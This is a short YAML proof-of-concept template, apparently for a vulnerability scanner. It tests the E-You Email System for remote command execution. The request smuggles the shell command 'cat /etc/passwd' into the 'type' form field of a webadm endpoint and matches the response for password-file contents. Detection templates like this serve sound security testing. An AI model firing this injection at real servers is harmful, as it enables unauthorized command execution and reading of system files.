id: poc-yaml-e-you-email-system-rce
info:
  name: E-You Email System 远程命令执行漏洞
  severity: high
  tags:
  - rce
  finger: E-You Email System
  osprey-id: vb_2021_0024
requests:
- method: POST
  path: /webadm/?q=moni_detail.do&action=gragh
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: type='|cat /etc/passwd||'
  expression: 'contains(body, "root:") && contains(body, "/bin") && contains(body,
    "var _location = window.location;")

    '
variables: {}
transport: http
